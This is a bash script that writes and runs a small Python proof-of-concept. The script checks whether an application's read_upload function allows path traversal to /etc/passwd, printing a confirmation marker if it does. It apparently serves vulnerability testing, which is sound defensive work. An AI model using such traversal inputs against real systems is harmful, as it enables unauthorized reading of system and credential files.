#!/bin/bash

cat > /poc/repro.py <<'PY'
import sys
sys.path.insert(0, "/src")

from app import read_upload

# Try to read /etc/passwd via path traversal
try:
    content = read_upload("../etc/passwd")
    if "root:" in content:
        print("VULN_CONFIRMED_TRAVERSAL")
    else:
        print("NO_TRAVERSAL_FOUND")
except Exception as e:
    print(f"ERROR: {e}")
PY

PYTHONPATH=/src python3 /poc/repro.py